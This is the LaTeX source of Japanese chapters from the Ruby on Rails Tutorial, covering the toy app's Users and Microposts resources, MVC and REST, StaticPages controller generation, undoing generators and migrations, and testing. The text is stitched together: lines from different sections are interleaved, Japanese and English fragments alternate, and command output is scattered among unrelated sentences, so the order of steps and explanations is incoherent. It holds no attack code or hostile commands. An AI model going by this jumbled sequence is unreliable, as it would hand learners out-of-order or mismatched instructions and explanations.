リスト\ref{code:gemfile_sample_app}はリスト\ref{code:gemfile_sqlite_version}やリスト\ref{code:demo_gemfile_sqlite_version_redux}は基本的にまったく同じですが、\kode{test}グループ内のgemだけが若干異なっています。ここではもう少し高度なテスト用オプションを設定しています (\ref{sec:advanced_testing_setup})
\kode{rake db:migrate}が一番よく使われるコマンドですが、rakeに\kode{-T db}オプションを付けて実行すると他にもさまざまなデータベースタスクが用意されているのがわかります。
  $ bundle exec rake -T db
(\emph{注}: もしサンプルアプリケーションの開発で必要になるgemを\emph{すべて}知りたい場合は、リスト\ref{code:final_gemfile}を参照してください。これが最終的なGemfileになります)。
rakeで実行可能なタスクをすべて表示するには以下を実行します。
  $ bundle exec rake -T
コマンドの多さに圧倒されがちですが、すべてのコマンドを今覚える必要はまったくありませんので、心配は無用です。
\emph{Railsチュートリアル}を最後まで読み終わる頃には、重要なコマンドは一通り使えるようになっていることでしょう。
上のオプションを指定することで、PostgreSQL用の\texttt{pg} gemをdevelopment環境にインストールせず、代わりにSQLiteがdevelopment環境testing環境で使用されるようになります。
ブラウザでルートURL「/」(「スラッシュ」と読みます: \ref{sec:hello_world}参照) を開くと、図\ref{fig:riding_rails}と同じRailsのデフォルトページが表示されますが、Usersリソースをscaffoldで生成したことで、ユーザー管理用のページが多数追加されている点が異なります。
Herokuでは、development環境とproduction環境とで異なるデータベースを使用することを非推奨としていますが、幸いにもこのサンプルアプリケーションでは両者の違いは生じません。また、SQLiteの方がPostgreSQLよりもローカルでのインストールや設定が\emph{ずっと楽}なので、今回はことなるデータベースを使うことにします。
たとえば、\href{http://localhost:3000/users}{/users}を表示すればすべてのユーザーの一覧が表示されますし、\href{http://localhost:3000/users/new}{/users/new}を表示すれば新規ユーザー作成ページが表示されます。
最終的には皆さんがPostgreSQLをdevelopment環境にインストールして設定できるようになるのが理想ですが、今は時期尚早であると考えます。
このセクションでは以後、ユーザーに関連するページについて手短に説明します。
実際に必要が生じたときは「install configure postgresql <自分のシステム>」や「rails postgresql setup」でググって各自挑戦してみてください
その際、表2.1\ref{table:user_urls}に記載されている、ページとURLの関係を参照するとわかりやすいと思います。
(クラウドIDEの場合は<自分のシステム>にUbuntuと指定します)。
id=\kode{1}のユーザーを表示するページ
新規ユーザーを作成するページ
Usersリソースにおける、ページとURLの関係。
まずはユーザーの一覧を表示する\href{http://localhost:3000/users}{\texttt{index}}ページを見てみましょう。もちろん、この時点ではまだユーザーは登録されていません (図\ref{fig:demo_blank_user_index_rails_3})。
Usersリソース (\href{http://localhost:3000/users}{/users}) ページの最初の状態
ユーザーを新規作成するには、図\ref{fig:demo_new_user_rails_3}の\href{http://localhost:3000/users/new}{\texttt{new}}ページを表示します
In Chapter \ref{cha:sign_up}, this will become the user signup page.
$ bundle
新規ユーザー作成ページ (\href{http://localhost:3000/users/new}{/users/new})
\label{fig:demo_new_user_rails_3}}<n>\end{figure}<n><n>\noindent 
テキストフィールドに名前とメールアドレスを入力して [Create User] ボタンを押してください。
ここまで進めたら、後はGitリポジトリを初期化するだけです
ユーザーが作成され、図\ref{fig:demo_show_user_rails_3}のように\href{http://localhost:3000/users/1}{\texttt{show}}ページが表示されます
最初のアプリケーションのときと同様に、まずはアプリケーションのルートディレクトリにある\kode{README}ファイルを更新して、具体的な作業内容をわかりやすく記入しておくことをおすすめします。
(緑色のウェルカムメッセージは、\ref{sec:the_flash}で解説する \emph{flash}という機能を使用して表示しています)。
最初にGitのコマンドでREADMEのファイル形式をRDocからMarkdownに変更します。
ここで、URLが\href{http://localhost:3000/users/1}{/users/1}と表示されていることに注目してください。ご想像のとおり、この数字\kode{1}は図\ref{fig:demo_user_model}.の\kode{id}属性そのものです。
In Section \ref{sec:showing_users}, this page will become the user’s profile.
続いてリスト\ref{code:sample_app_readme}の内容をREADMEに記入します。
ユーザー表示用のページ (\href{http://localhost:3000/users/1}{/users/1})
サンプルアプリケーション向けに書き換えた\kode{README}
今度は、ユーザー情報を変更するために\href{http://localhost:3000/users/1/edit}{\texttt{edit}}ページを表示してみましょう (図\ref{fig:demo_edit_user_rails_3})。
# Ruby on Railsチュートリアル: サンプルアプリケーション<n><n>これは以下に基づいたサンプル・アプリケーションです<n>[*Ruby on Railsチュートリアル:<n>実例を使ってRailsを学ぼう*](http://railstutorial.jp/)<n>[Michael Hartl](http://www.michaelhartl.com/)著
この編集ページ上でユーザーに関する情報を変更し、[Update User] ボタンを押せば、Toyアプリケーション内のユーザー情報が変更されます (図\ref{fig:demo_update_user_rails_3})。
最後に、変更をコミットします。
(詳細は第\ref{cha:modeling_users}章で説明しますが、このユーザー情報は、Webアプリケーションの背後にあるデータベースに保存されています。)
\ref{sec:git_commands}で\kode{git commit -a -m "Message"}というGitコマンドを実行したことを思い出してください。あのときは “すべてを変更” (\kode{-a}) オプションとコミットメッセージを追加するオプション (\kode{-m}) を使用しました。
We’ll add user edit/update functionality to the sample application in Section \ref{sec:updating_users}.
上で実行したコマンドで示したように、実はこれらの2つのオプションを1つにまとめて\kode{git commit -am "Message"}と実行することができます。
ユーザー編集用のページ (\href{http://localhost:3000/users/1/edit}{/users/1/edit})
本書では今後もこのサンプルアプリケーションを使い続けるので、\href{https://bitbucket.org/repo/create}{Bitbucket上にリポジトリを作成してプッシュしておく}とよいでしょう。
情報が更新されたユーザー
ここまで作業を進めると、\href{https://github.com/railstutorial/sample_app_rails_4}{著者がGitHubにアップロードしたRailsチュートリアルのサンプルアプリケーション}のようになります (ユーザー名は\texttt{railstutorial}で、アプリケーション名は\texttt{sample_app_rails_4}と若干異なります)
ここで\href{http://localhost:3000/users/new}{\texttt{new}}ページに戻り、ユーザーをもう1人作成してみましょう。\href{http://localhost:3000/users}{\texttt{index}}ページを表示してみると、\ref{fig:demo_user_index_two_rails_3}のようにユーザーが追加されています。
後で統合時に悩まずにすむよう、アプリをなるべく早い段階でHerokuにデプロイしておくとよいでしょう。
\ref{sec:showing_users}ではもっと本格的なユーザー一覧ページを作成する予定です。
第\ref{cha:beginning} 章や第\ref{cha:a_toy_app}章, I suggest following the “hello, world!”
2人目のユーザーが追加された一覧ページ (\href{http://localhost:3000/users}{/users})
このコードはリスト\ref{code:hello_action}で使用されていました。もうひとつ、
ユーザーの作成、表示、編集方法について説明しましたので、今度はユーザーを削除してみましょう (図\ref{fig:demo_destroy_user})。
第\ref{cha:a_toy_app}章でも指摘したとおり、主な理由は、デフォルトのRailsページはHerokuで破損してしまうことが多く、そのままだとデプロイが成功したのか失敗したのかがわかりにくいためです。
図\ref{fig:demo_destroy_user}の [Destroy] リンクをクリックするとユーザーが削除され、indexページのユーザーは1人だけになります
続いてこの変更をコミットし、Herokuにプッシュします。
(もしこのとおりにならない場合は、ブラウザのJavaScriptが有効になっているかどうかを確認してください。Railsでは、ユーザーを削除するリクエストを発行するときにJavaScriptを使用しています)。
なお、\ref{sec:deleting_users}ではサンプルアプリケーションにユーザーを削除する機能を実装し、管理権限 (admin) を持つユーザー以外は削除を実行できないように制限をかけます。
ユーザーを削除する
これでUsersリソースの概略についての説明が終わりましたが、ここで\ref{sec:mvc}で紹介した MVC (Model-View-Controller = モデル-ビュー-コントローラ) パターンの観点からこのリソースを考察してみましょう。
(\ref{sec:deploying}のときと同じように警告メッセージが表示されることがありますが、無視して構いません。
具体的には、\href{http://localhost:3000/users}{/users}のindexページをブラウザで開くという典型的な操作を行うときに何が起こっているかをMVC (図\ref{fig:mvc_detailed}) で説明します。
この警告は\ref{sec:professional_grade_deployment}で解決する予定です)。
これで、Herokuアプリのアドレス以外は図\ref{fig:heroku_app}のとおりに表示されるはずです。
RailsにおけるMVC
図\ref{fig:mvc_detailed}で行われている手順の概要を以下に示します。
ブラウザから「/users」というURLのリクエストをRailsサーバーに送信する。
この後も、本チュートリアルを進めながらアプリケーションをこまめにプッシュ/デプロイすることをおすすめします。こうすることでリモートバックアップにもなり、production環境でのエラーを早めに確認することもできます (訳注: 最後にまとめてプッシュ/デプロイすると問題が同時多発して解決に手間取ることが考えられます)。
「/users」リクエストは、Railsのルーティング機構 (ルーター) によってUsersコントローラ内の\kode{index}アクションに割り当てられる。
なお、Herokuに展開するときにエラーが発生した場合は、以下のコマンドを実行して本番環境のログを取得してください。このログは、問題を特定するときに役立ちます。
\kode{index}アクションが実行され、そこからUserモデルに、「すべてのユーザーを取り出せ」(\kode{User.all})と問い合わせる。
\emph{注}: 今後Herokuで何らかの本番アプリケーションを運用する予定があるなら、\ref{sec:professional_grade_deployment}のproduction用Webサーバーの設定に必ず従ってください。
Userモデルは問い合わせを受け、すべてのユーザーをデータベースから取り出す。
\ref{sec:sample_app_setup}の準備がすべて完了したら、いよいよサンプルアプリケーションの開発に取りかかりましょう。
データベースから取り出したユーザーの一覧をUserモデルからコントローラに返す。
ここで静的なページを作るために採用した方法は、おそらく最もシンプルな方法です。ただし他にも方法はあります。
Usersコントローラは、ユーザーの一覧を\kode{@users}変数 (@はRubyのインスタンス変数を表す) に保存し、\kode{index}ビューに渡す。
最適な方法は状況によって異なり、たとえば\emph{極めて多数}の静的なページを1つのStaticPagesコントローラだけまかなおうとすると重荷になる可能性があります。今回はいくつかの静的なページを作るだけなので、重荷にはなりません。
indexビューが起動し、ERB (Embedded RuBy: ビューのHTMLに埋め込まれているRubyコード) を実行して HTMLを生成 (レンダリング) する。
もし多数の静的なページが必要になる場合は、\href{https://github.com/thoughtbot/high_voltage}{\texttt{high\_voltage}} gem を調べてみてください。
コントローラは、ビューで生成されたHTMLを受け取り、ブラウザに返す
なお、この問題には (やや古いですが) 有益な議論があります。 詳しくは \href{http://blog.hasmanythrough.com/2008/4/2/simple-pages}{hasmanythroughに投稿された記事「simple pages」} (英語) を読んでみてください。
ビューは、(ApacheやNginxなどのWebサーバーを経由してはいるが) ブラウザにHTMLを直接返すと説明している文献もあります。
コントローラについては第\ref{cha:a_toy_app}章でも簡単に触れましたが、第\ref{cha:modeling_users}章で説明する\href{http://en.wikipedia.org/wiki/Representational_State_Transfer}{REST アーキテクチャ}を読むと理解が深まります。一言で言うと、コントローラとは (基本的に動的な) Webページの集合を束ねるコンテナのことです。
私は、Railsの実際の実装とは無関係に、コントローラを情報の流れの中心となるハブとみなすことを好んでいます。
現在どのディレクトリで作業しているかがわからなくなった場合は、\ref{sec:the_hello_application} (図\ref{fig:directory_structure_rails})を再度参照して、Rails のディレクトリ構造を確認してください。
上の流れをもう少し詳しく見てみることにします。
この節では、主に\kode{app/controllers}ディレクトリや\kode{app/views}ディレクトリ内で作業を進めます
最初にブラウザからのリクエストを見てみましょう。このリクエストは、アドレスバーにURLを入力したりリンクをクリックした時に発生します (図\ref{fig:mvc_detailed}の①)。
\ref{sec:git_commands}で学んだことを思い出しましょう。Gitを使用する場合は、masterブランチでずっと作業するのではなく、その都度トピックブランチを作成して作業するのがよい習慣です。
Gitでバージョン管理を行っているのであれば、以下のコマンドを実行して、静的なページ用のトピックブランチをチェックアウトしましょう。
ユーザーからリクエストされたURLをUsersリソースで使用するコントローラのアクションに割り当てる (マッピングする) コードは、リスト\ref{code:rails_routes}のような感じになります。このコードはRailsのルーター設定ファイル (config/routes.rb) の中で使用され、URLとアクションの組み合わせ (表\ref{table:user_urls}) を効率よく設定することができます
(\kode{:users}という一見奇妙な記法は、Ruby言語特有の「\emph{シンボル}」と呼ばれるものです。詳細については\ref{sec:hashes_and_symbols}で説明します)。
static-pages
Railsルートで使用するUsersリソース用のルール
(1行目は、確実にmasterブランチに切り替えるために行っています。これにより、2行目の\kode{static-pages}トピックブランチが\kode{master}から作成されるようになります。
もしすでにmasterブランチにいる場合は、1行目のコマンドを実行する必要はありません)。
それでは、このルーティングファイルを変更してみましょう。サーバーのルートURLにアクセスしたら、デフォルトのページの代わりにユーザー一覧を表示するようにします。つまり、「/」(スラッシュ) にアクセスしたら/usersを開くようにします。
リスト\ref{code:hello_root_route}で以下の変更を行ったことを思い出してください。
静的なページの作成は、第\ref{cha:a_toy_app}章でscaffold生成に使用した \kode{generate} スクリプトで、コントローラを生成することから始めます。
このコントローラは静的なページを扱うためにしか使わないので、コントローラ名を「Static Pages」に決め、表記を\href{https://en.wikipedia.org/wiki/CamelCase}{キャメルケース}の\kode{StaticPages}にします。
続いて、Homeページ、Helpページ、Aboutページに使用するアクションもそれぞれ作成することにし、アクション名はすべて小文字の\kode{home}、\kode{help}、\kode{about}にします。
これにより、ルートにアクセスするとApplicationコントローラ内の\kode{hello}アクションにルーティングされるようになったのでした。
\kode{generate}スクリプトではアクション名をまとめて指定することもできるので、コマンドラインでHomeページとHelpページ用のアクションもまとめて生成することにします。なお、Aboutページだけは学習のため、あえてコマンドラインでは作成せず、\ref{sec:getting_started_with_testing}で手動で追加することにします。
今回の場合は、Usersコントローラの\kode{index}アクションを使用したいので、リスト\ref{code:rails_routes_root_route}のコードを元に書き換えてみましょう
これらの要素を盛り込んだStaticPagesコントローラ生成コマンドと実行結果をリスト\ref{code:generating_pages}に示します。
(既にApplicationコントローラに\kode{hello}アクションを追加していた方は、念のため削除しておくとよいかもしれません)。
StaticPagesコントローラを生成する
ルートからusersへのルーティングを追加する
\ref{sec:a_user_tour}以降で紹介した各ページは、Users\emph{コントローラ}内の\emph{アクション}にそれぞれ対応しています。1つのコントローラには、関連する多数のアクションがまとめられています。
      create  app/controllers/static_pages_controller.rb
リスト\ref{code:demo_users_controller}は、scaffoldで生成したコントローラの骨格です。
\kode{class UsersController < ApplicationController}という記法では、Rubyの\emph{クラス}\emph{継承}の文法をそのまま使用していることにご注目ください
      create    app/views/static_pages
(We’ll discuss inheritance briefly in Section \ref{sec:inheritance_hierarchies} and cover both subjects in more detail in Section \ref{sec:ruby_classes}.)
      create    app/views/static_pages/home.html.erb
Usersコントローラの骨格
      create    app/views/static_pages/help.html.erb
      create    app/helpers/static_pages_helper.rb
      create      app/assets/javascripts/static_pages.js.coffee
      create      app/assets/stylesheets/static_pages.css.scss
本チュートリアルではわかりやすさを重んじているため、こうしたコマンドは短縮せずに表記していますが、現実のRails開発者はほぼ間違いなく表\ref{table:shortcuts}の短縮形を常用しています。
完全なコマンド
$ rails s
$ rails c
$ rails g
ページの数よりもアクションの数の方が多いことにお気付きでしょうか。\kode{index}、\kode{show}、\kode{new}、\kode{edit}アクションはいずれも\ref{sec:a_user_tour}のページに対応していますが、それ以外にも\kode{create}、\kode{update}、\kode{destroy}アクションがあります。
通常、これらのアクションは、ページを出力せずにデータベース上のユーザー情報を操作します (もちろんページを出力しようと思えばできますが)。
$ rake test
論文の正式なタイトル: Fielding, Roy Thomas.
$ rake
\emph{Architectural Styles and the Design of Network-based Software Architectures}.
Railsで使える短縮形の例
Doctoral dissertation, University of California, Irvine, 2000.
次に進む前に、StaticPagesコントローラファイルをGitリポジトリに追加しておきましょう。
表\ref{table:demo_RESTful_users}のURLには重複しているものがあることにご注目ください。たとえば、\kode{show}アクションと \kode{update}アクションは、どちらも/users/1というURLに対応しています。
これらのアクション同士の違いは、それらのアクションに対応する\href{http://en.wikipedia.org/wiki/HTTP_request#Request_methods}{HTTP requestメソッド}の違いでもあります。
最後のコマンドでは、\kode{static-pages}トピックブランチをBitbucketにプッシュしています。
以後は、単に以下を実行するだけで同じプッシュが行われるようになります。
HTTP requestメソッドの詳細については\ref{sec:getting_started_with_testing}で説明します。
上のコミット〜プッシュの流れは、著者が実際の開発でよく使っていたパターンに基づいていますが、ここから先は途中でこのような指示をいちいち書くことはしませんので、各自こまめにプッシュするようにしてください。
ただし、上のような命名は単なる慣習に過ぎません。実際、コマンドライン上で以下のようなスネークケースのコントローラ名を入力しても、
先ほどと同様に\kode{static\_pages\_controller.rb}というコントローラが生成されます。
これは、Rubyがクラス名にキャメルケースを使う慣習があり (詳細は\ref{sec:ruby_classes}で説明します)、また、キャメルケースの名前を使うことが好まれているためです。これらの慣習に必ず従わなければいけないということではありません。
(Since Ruby filenames typically use snake case, the Rails generator converts CamelCase to snake case using the \href{http://api.rubyonrails.org/classes/ActiveSupport/Inflector.html#method-i-underscore}{\texttt{underscore}} method.)
ところで、自動生成に失敗するようなことがあれば、元に戻す処理を学ぶ良い機会になります。
元に戻す方法
id=\kode{1}のユーザーを更新するアクション
どれほど十分に気を付けていたとしても、Railsアプリケーションの開発中に何か失敗してしまうことはありえます。
ありがたいことに、Railsにはそのような失敗をカバーする機能がいくつもあります。
id=\kode{1}のユーザーを削除するアクション
一般的なシナリオの1つは、生成したコードを元に戻したい場合です。たとえば、コントローラを生成した後で、もっといいコントローラ名を思い付き、生成したコードを削除したくなった場合などです。
リスト\ref{code:rails_routes}のUsersリソースが提供するRESTfulなルート
Because Rails creates a substantial number of auxiliary files along with the controller (as seen in Listing \ref{code:generating_pages}), this isn’t as easy as removing the controller file itself; 自動生成されたコードを元に戻すためには、新規作成されたファイルを削除するだけではなく、既存のファイルに挿入されたコードも削除する必要があります
REpresentational State Transfer (REST)
(実際、\ref{sec:demo_users_resource}や\ref{sec:microposts_resource}でも説明したように、\texttt{rails generate}を実行するとルーティングの\texttt{routes.rb}ファイルも自動的に変更されるので、これも元に戻さなくてはなりません)。
Rails関連の書籍を読んでいると “REST” という略語をよく見かけます。これはREpresentational State Transferの略です。
このようなときは、「generate」という言葉に因んで、\texttt{rails destroy}というコマンドを実行することで元に戻すことができます。
RESTは、インターネットそのものやWebアプリケーションなどの、分散・ネットワーク化されたシステムやアプリケーションを構築するためのアーキテクチャのスタイルの1つです。
たとえば次の2つのコマンドは、自動生成と、それに対応する取り消し処理の例です。
以前のRailsではデータの更新にHTTPの\texttt{PUT}リクエストを使用していましたが、HTTP標準に従えば\texttt{PATCH}リクエストの方が適切です。
  $ rails generate controller StaticPages home help<n>  $ rails destroy  controller StaticPages home help
Rails開発者にとっては、RESTfulなスタイルを採用することで、作成すべきコントローラやアクションの決定が楽になります。作成(C)・読み取り(R)・更新(U)・削除(D)を行うリソースだけでアプリケーション全体を構成してしまうことすら可能です。
なお第\ref{cha:modeling_users} 章でも、以下のように\emph{モデル}を自動生成する方法を紹介します。
ユーザーやマイクロポストなどに関しては自然にリソース化できるので問題ありません。
In Chapter \ref{cha:following_users}, we’ll see an example where REST principles allow us to model a subtler problem, “following users”, in a natural and convenient way.
  $ rails generate model User name:string email:string
UsersコントローラとUserモデルの関係をさらに考察するために、リスト\ref{code:demo_index_action}で\kode{index}アクションを整理してみました
 (scaffoldで自動生成されるコードは冗長で紛らわしいので除いてあります)。
モデルの自動生成についても、同様の方法で元に戻すことができます。
Toyアプリケーションの簡潔なユーザー\kode{index}アクション
  $ rails destroy model User
(上のコマンドからわかるように、モデル名以外の引数は不要です。
\kode{index}アクションに\kode{@users = User.all}という行があります (図\ref{fig:mvc_detailed}の③に相当)。これによって、Userモデルからすべてのユーザーの一覧を取り出し (④)、\kode{@users}という変数に保存します (⑤)。なお、@usersは「あっと ゆーざーず」と発音します。
Userモデルの内容はリスト\ref{code:demo_user_model}にあります。驚くほどシンプルな内容ですが、継承 (\ref{sec:inheritance_hierarchies}および\ref{sec:ruby_classes}) によって多くの機能が備わっています。
その理由については第\ref{cha:modeling_users}章で説明します)。
特に、\emph{Active Record}というRubyライブラリのおかげで、リスト\ref{code:demo_user_model}のUserモデルは\kode{User.all}というリクエストに対して、DB上のすべてのユーザーを返すことができます。
また、\emph{第\ref{cha:a_toy_app}章}でも簡単に紹介しましたが、\emph{マイグレーション}の変更を元に戻す方法も用意されています。詳細は第\ref{cha:modeling_users}章で説明します。
ToyアプリケーションのUserモデル
簡単に言うと、まず以下のコマンドでデータベースのマイグレーションを変更できます。
\kode{@users}変数にユーザー一覧が保存されると、コントローラはリスト\ref{code:demo_index_view}の \emph{ビュー} を呼び出します (⑥)。
  $ bundle exec rake db:migrate
以下のコマンドで1つ前の状態に戻すこともできます。
変数
  $ bundle exec rake db:rollback
(今はこのコードの意味がわからなくても問題ありません。
最初の状態に戻したい場合は、以下のコマンドを使います。
これはあくまで説明のためのものです)。
  $ bundle exec rake db:migrate VERSION=0
indexアクションに対応しているビュー
既にお気付きの方もいると思いますが、マイグレーションは逐次的に実行され、それぞれのマイグレーションに対してバージョン番号が付与されます。したがって、上記の\texttt{0}を別の数字に置き換えることによって、指定したバージョンの状態に戻すことができます。
<table>
開発中に\href{http://en.wikipedia.org/wiki/Military_slang#SNAFU}{袋小路}に迷い込んでしまった場合でも、これらの機能を使えば元の状態を復元できます。
</tr>
リスト\ref{code:generating_pages}のようにStaticPagesコントローラを生成すると、(\kode{config/routes.rb})ファイルが自動的に更新されます (\ref{sec:hello_world}のときと同様です)。
このルーティングファイルはルーターの実装を受け持ち (図\ref{fig:mvc_detailed})、URLとWebページの対応関係を定義します。
</table>
このルーティングファイルはRailsの\kode{config}ディレクトリの下に置かれます。このディレクトリには、Railsの設定ファイルがまとめて置かれます (図\ref{fig:config_directory_rails})。
ビューはその内容をHTMLに変換し (⑦)、コントローラがブラウザにHTMLを送信して、ブラウザでHTMLが表示されます (⑧)。
サンプルアプリケーションの\kode{config}ディレクトリの内容
scaffoldで作成したUsersリソースは、Railsの概要を手っ取り早く説明するには良いのですが、以下のようなさまざまな問題点を抱えています。
先ほどリスト\ref{code:generating_pages}のように\kode{home} アクションと \kode{help}アクションを生成したので、routesファイルにはそれぞれのアクションで使用されるルールが定義されています (リスト\ref{code:pages_routes})。
データの検証が行われていない。
StaticPagesコントローラ内の\kode{home}アクションと\kode{help}アクションで使用するルーティング
このままでは、ユーザー名が空欄であったり、でたらめなメールアドレスを入力したりしても通ってしまいます。
ここで以下のルールに注目してみましょう。
具体的には、\kode{get} と書かれているため、\texttt{GET} リクエストに対して該当するアクションを結びつけています。
結果を確認するには、\ref{sec:rails_server}に従って以下のようにRailsのdevelopmentサーバーを起動します。
\href{http://localhost:3000/static_pages/home}{/static\_pages/home}にアクセスして結果を表示します (図\ref{fig:raw_home_view})。
\href{http://localhost:3000/static_pages/home}{/static\_pages/home}にアクセスした結果
\texttt{GET}やその他のHTTPメソッドについて
\href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods}{クライアント} (通常、FirefoxやSafariなどのWebブラウザ) と\href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods}{サーバー} (ApacheやNginxなどのWebサーバー) は、上で述べた4つの基本操作を互いに認識できるようになっています
(ローカル環境でRailsアプリケーションを開発しているときは、クライアントとサーバーが同じコンピュータ上で動いていますが、一般的には、それぞれ別のコンピュータで動作しているという点を理解しておいてください)。
ユーザー認証が行われていない。
Railsを含む多くのWebフレームワークは、HTTPの各操作を発展させた\emph{REST アーキテクチャ}の影響を受けています。第\ref{cha:a_toy_app}章でも簡単に触れましたが、第\ref{cha:sign_up}章では、より深い内容について学びます。
ログイン、ログアウトが行われていないので、誰でも無制限に操作できてしまいます。
\texttt{POST} は、GETの次によく使用される操作で、ページ上のフォームに入力した値を、ブラウザから送信する時に送られるリクエストです。
テストが書かれていない。
Railsアプリケーションでは、\texttt{POST}リクエストは何かを\emph{作成する}ときによく使われます (なお本来のHTTPでは、\texttt{POST}を更新に使ってもよいとしています)。
厳密にはこれは正しい表現ではありません。というのも、scaffoldで生成したコードにはごく簡単なテストが一応含まれているからです。ただ、scaffoldのテストコードはデータ検証やユーザー認証、その他の必要な要求を満たしていません。
レイアウトやスタイルが整っていない。
たとえば、ユーザー登録フォームで新しいユーザーを作成するときは、\texttt{POST}リクエストを送信します。
サイトデザインも操作法も一貫していません。
他にも、\texttt{PATCH}と \texttt{DELETE}という2つの操作があり、それぞれサーバー上の何かを\emph{更新}したり\emph{削除}したりするときに使われます。
理解が困難。
これら2つの操作は、\texttt{GET}や\texttt{POST}ほどは使用されていません。これは、ブラウザがPATCHとDELETEをネイティブでは送信しないからです。しかし、Ruby on Railsなどの多くのWebフレームワークは、ブラウザがこれらの操作のリクエストを\emph{送信しているかのように見せかける}技術 (偽装) を駆使して、PATCHとDELETEという操作を実現しています。
scaffoldのコードを理解できるぐらいなら、そもそも本書を読む必要はないでしょう。
結果として、Railsはこの4つのHTTPリクエスト (\texttt{GET}・\texttt{POST}・\texttt{PATCH}・\texttt{DELETE}) を全てサポートできるようになりました。
<n>\end{itemize}<n><n>    % subsection weaknesses_of_the_users_resource (end)<n><n>  % section users_resource (end)<n><n>  \section{Microposts リソース} % (fold)<n>  \label{sec:microposts_resource}<n><n>
Usersリソースを生成して内容を理解しましたので、今度はMicropostsリソースで同じことをやってみましょう。
このページがどのようにして表示されるのかを理解するために、まずはテキストエディタでStaticPagesコントローラを開いてみましょう。リスト\ref{code:static_pages_controller}のような内容になっているはずです。
なお、この節全体について、Micropostsリソースを理解する際には\ref{sec:demo_users_resource}のuser要素と比較しながら進めることをお勧めします。実際、これらの2つのリソースはさまざまな面で似通っています。
ここで、第\ref{cha:a_toy_app}章のUsersコントローラやMicropostsコントローラとは異なり、StaticPagesコントローラは一般的なRESTアクションに対応していないことに注意してください。
RailsのRESTful構造を身体に叩きこむには、繰り返し学ぶのが一番です。UsersリソースとMicropostsリソースの構造の類似点を理解することが、この章の主要な目的です。
これは、静的なページの集合に対しては、適切なアクションと言えます。言い換えると、RESTアーキテクチャは、あらゆる問題に対して最適な解決方法であるとは限らないということです。
Usersリソースの場合と同様に、Micropostsリソースもscaffoldでコードを生成してみましょう。\kode{rails generate scaffold}コマンドを使用して、図\ref{fig:demo_micropost_model}のデータモデルを実装してみます
リスト\ref{code:generating_pages}で生成されるStaticPagesコントローラ
Userでscaffoldを実行した場合と同様に、scaffoldジェネレータではマイクロポストでもRailsモデルを単数形とする習慣に従います。実行したコマンドが\kode{generate Micropost}と単数形になっていたのはこのためです。
クラスは、\emph{関数} (\emph{メソッド}とも呼ばれます) をまとめるときに便利な手法です。今回の例では、\kode{def}というキーワードを使って、\kode{home}アクションや\kode{help}アクションを定義しています。
(具体的なクラスや継承については、\ref{sec:ruby_classes}で詳しく説明します)。
      create    app/models/micropost.rb
今回のStaticPagesコントローラにあるメソッドは、以下のようにどちらも最初は空になっています。
純粋なRuby言語であれば、これらのメソッドは何も実行しません。
      create      test/models/micropost_test.rb
しかし、Railsでは動作が異なります。\kode{StaticPagesController}はRuby のクラスですが、\kode{ApplicationController}クラスを継承しているため、StaticPagesControllerのメソッドは (たとえ何も書かれていなくても) Rails特有の振る舞いをします。具体的には、/static\_pages/homeというURLにアクセスすると、RailsはStaticPagesコントローラを参照し、\kode{home}アクションに記述されているコードを実行します。その後、そのアクションに対応する\emph{ビュー} (\ref{sec:mvc}で説明したMVCのVに相当) を出力します。
      create      test/fixtures/microposts.yml
では、ビューはどのように出力されるのでしょうか。また、どのビューが表示されるのでしょうか。
       route  resources :microposts
 \kode{.erb}の詳細については\ref{sec:slightly_dynamic_pages}で説明しますが、ファイル名に\kode{.html}が含まれていることからわかる、基本的にはHTMLと同じような構造になっています (\ref{code:raw_home_view})。
      create    app/controllers/microposts_controller.rb
Homeページ用に生成されたビュー
\kode{help}アクションに対応するビューも、上のコードと似ています (リスト\ref{code:raw_help_view})。
      create      app/views/microposts
Helpページ用に生成されたビュー
      create      app/views/microposts/index.html.erb
どちらのビューも単なるプレースホルダになっています。トップレベルの見出しが\kode{h1}タグの中にあり、関連するファイルへの絶対パスが\kode{p}タグの中に書かれています。
      create      app/views/microposts/edit.html.erb
      create      app/views/microposts/show.html.erb
We’ll add some (very slightly) dynamic content starting in Section \ref{sec:slightly_dynamic_pages}, but as they stand the views in Listing \ref{code:raw_home_view} and Listing \ref{code:raw_help_view} underscore an important point: Rails views can simply contain static HTML. This means we can begin customizing the Home and Help pages even with no knowledge of Rails, as shown in Listing \ref{code:custom_home_page} and Listing \ref{code:custom_help_page}.
      create      app/views/microposts/new.html.erb
HomeページのHTMLを修正する
      create      app/views/microposts/_form.html.erb
      create      test/controllers/microposts_controller_test.rb
HelpページのHTMLを修正する
<n>      create      app/helpers/microposts_helper.rb
  Get help on the Ruby on Rails Tutorial at the
  To get help on this sample app, see the
      create        test/helpers/microposts_helper_test.rb
      create      app/views/microposts/index.json.jbuilder
リスト\ref{code:custom_home_page}とリスト\ref{code:custom_help_page}の結果をそれぞれ図\ref{fig:custom_home_page}と図\ref{fig:custom_help_page}に示します。
      create      app/views/microposts/show.json.jbuilder
修正されたHomeページ
修正されたHelpページ
\ref{sec:custom_static_pages}でサンプルアプリのHomeページとHelpページを作成して中身も書き加えたので、今度はAboutページを同様に追加します。
      create      app/assets/javascripts/microposts.js.coffee
何らかの変更を行う際には、常に「\emph{自動化テスト}」を作成して、機能が正しく実装されたことを確認する習慣をぜひ身に付けましょう。
      create      app/assets/stylesheets/microposts.css.scss
アプリケーションを開発しながら\emph{テストスイート}をみっちり作成しておけば、いざというときのセーフティネットにもなり、それ自体がアプリケーションのソースコードの「実行可能なドキュメント」にもなります。
テストを作成するということは、その分コードを余分に書くことになりますが、正しく行えば、むしろテストがないときよりも確実に開発速度が\emph{アップ}します。テストが揃っていれば、バグを追うために余分な時間を使わずに済むためです。
   identical    app/assets/stylesheets/scaffolds.css.scss
そんなふうにうまくいくとは信じられない人もいるかもしれませんが、一度でもテスト作成が上達すれば間違いなくこのとおりになります。だからこそ、テスト作成の習慣をできるだけ早いうちに身につけることが重要なのです。
(Springに関連したエラーが発生したら、同じコマンドをもう一度実行してみてください)。
テストが重要であるという点ではRails開発者の意見はほぼ一致していますが、細かい点では異論が生じているのも確かです。
新しいデータモデルでデータベースを更新するには、\ref{sec:demo_users_resource}のときと同様にマイグレーションを実行します。
結局テストはいつ行えばよいのか
==  CreateMicroposts: migrating =============================
それではいつ、どんなふうにテストを行えばよいのでしょうか。この点を理解するために、テストを行う\emph{目的}をもう一度確認してみましょう。著者は、テストには以下の3つのメリットがあると考えます。
-- create_table(:microposts)
